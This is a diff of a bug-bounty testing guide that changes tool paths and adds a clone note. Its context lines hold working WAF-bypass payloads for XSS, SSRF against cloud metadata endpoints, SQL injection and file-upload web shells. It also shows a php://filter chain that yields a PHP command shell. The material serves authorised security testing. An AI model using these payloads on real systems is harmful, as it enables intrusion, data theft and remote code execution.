@@ -142,7 +142,7 @@ location.href = userInput
 - XSS + credential theft via fake login form = ATO
 - **No JS allowed?** CSS injection can still exfil tokens via attribute selectors — see **CSS Injection**
 
-**WAF bypass for XSS**: Run `tools/waf_encoder.py "<payload>" --class xss` to get 20+ variants (HTML entity, unicode escape, base64-wrapped). Try `<svg onload=eval(atob('...'))>` or `<svg><animate onbegin=alert(1) attributeName=x dur=1s>` when `<script>` is blocked. Probe which chars are allowed by testing individually, then construct payload from unblocked chars.
+**WAF bypass for XSS**: Run `bughunter/tools/waf_encoder.py "<payload>" --class xss` to get 20+ variants (HTML entity, unicode escape, base64-wrapped). Try `<svg onload=eval(atob('...'))>` or `<svg><animate onbegin=alert(1) attributeName=x dur=1s>` when `<script>` is blocked. Probe which chars are allowed by testing individually, then construct payload from unblocked chars.
 
 ### postMessage Testing
 DOM XSS variant where `window.addEventListener("message", ...)` lacks proper `event.origin` validation. Common on SDK callbacks, OAuth redirect handlers, iframe widgets, chat/analytics scripts — easy to miss because the entry point is **indirect** (no URL parameter, no form field, source-code grep alone doesn't reveal whether the origin check is sound).
@@ -260,7 +260,7 @@ http://localhost:8080     # Admin panel
 - Cloud metadata = High (key exposure)
 - Cloud metadata + exfil keys = Critical
 
-**WAF bypass for SSRF**: If WAF blocks `127.0.0.1`/`169.254.169.254`, try `2130706433` (decimal), `0x7f000001` (hex), `[::1]` (IPv6), `[::ffff:127.0.0.1]` (IPv4-mapped), `127.0.0.1.nip.io` (DNS rebind), or `127。0。0。1` (full-width period U+3002). Run payload through `tools/waf_encoder.py "<payload>" --class generic`.
+**WAF bypass for SSRF**: If WAF blocks `127.0.0.1`/`169.254.169.254`, try `2130706433` (decimal), `0x7f000001` (hex), `[::1]` (IPv6), `[::ffff:127.0.0.1]` (IPv4-mapped), `127.0.0.1.nip.io` (DNS rebind), or `127。0。0。1` (full-width period U+3002). Run payload through `bughunter/tools/waf_encoder.py "<payload>" --class generic`.
 
 ---
 
@@ -361,7 +361,7 @@ grep -rn "\.query(" --include="*.js" --include="*.ts" | grep "\+"
 grep -rn "mysql_query\|mysqli_query" --include="*.php" | grep "\$"
 ```
 
-**WAF bypass for SQLi**: Run `tools/waf_encoder.py "<payload>" --class sqli` for comment-injection (`SE/**/LECT`), MySQL version comment (`/*!50000 UNION*/`), case-mix (`SeLeCt`), operator substitute (`OR`→`||`, `=`→`LIKE`), whitespace swap (`%0a`, `%0b`, `/**/ `). AWS WAF specifically: try `/**/` between every token. ModSecurity: try `/*!50000 UNION*/` + `%0a` space substitution.
+**WAF bypass for SQLi**: Run `bughunter/tools/waf_encoder.py "<payload>" --class sqli` for comment-injection (`SE/**/LECT`), MySQL version comment (`/*!50000 UNION*/`), case-mix (`SeLeCt`), operator substitute (`OR`→`||`, `=`→`LIKE`), whitespace swap (`%0a`, `%0b`, `/**/ `). AWS WAF specifically: try `/**/` between every token. ModSecurity: try `/*!50000 UNION*/` + `%0a` space substitution.
 
 ### Stack → DBMS (fingerprint before blind testing, or you miss it)
 | Tech signal | DBMS | Blind probe |
@@ -449,7 +449,7 @@ filename=shell.phtml, shell.pHp, shell.php5   → extension variants
 </svg>
 ```
 
-**WAF bypass for file upload**: Run `tools/multipart_mutator.py --file shell.aspx --field file` for 10 parser-confusion variants (boundary simplification, double-boundary case-insensitive confusion, charset=utf-16le part encoding, null-byte in boundary, Content-Disposition sub-param injection, per-part image/jpeg Content-Type). Combine with polyglot (GIF89a magic bytes + PHP payload). RFC 2231 filename: `filename*=utf-8''shell.php`. MIME Base64: `filename="=?utf-8?b?c2hlbGwucGhw?="`.
+**WAF bypass for file upload**: Run `bughunter/tools/multipart_mutator.py --file shell.aspx --field file` for 10 parser-confusion variants (boundary simplification, double-boundary case-insensitive confusion, charset=utf-16le part encoding, null-byte in boundary, Content-Disposition sub-param injection, per-part image/jpeg Content-Type). Combine with polyglot (GIF89a magic bytes + PHP payload). RFC 2231 filename: `filename*=utf-8''shell.php`. MIME Base64: `filename="=?utf-8?b?c2hlbGwucGhw?="`.
 
 ### Busboy / Undici Multipart Parser Internals (Node.js / Next.js)
 
@@ -1326,7 +1326,8 @@ print(base64.b64decode(blob).decode())   # decode the returned base64 to get cle
 **B. `php://filter` convert (iconv) chain — RCE with NO file upload.**
 By chaining `convert.iconv.*` encodings with `base64-decode`/`base64-encode`, you generate **arbitrary executable PHP entirely inside the wrapper string** and feed it to `include`. No writable directory, no upload, no log file needed — works on locked-down hosts where every other vector is dead. This is the modern go-to and turns a "read-only-looking" include into clean RCE.
 ```bash
-# Generate the chain (synacktiv tool) — produces one long php://filter string
+# Generate the chain with the synacktiv tool (external — not shipped here):
+#   git clone https://github.com/synacktiv/php_filter_chain_generator
 python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
 # -> ?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|...|resource=php://temp
 # then: &c=id   -> command output in response
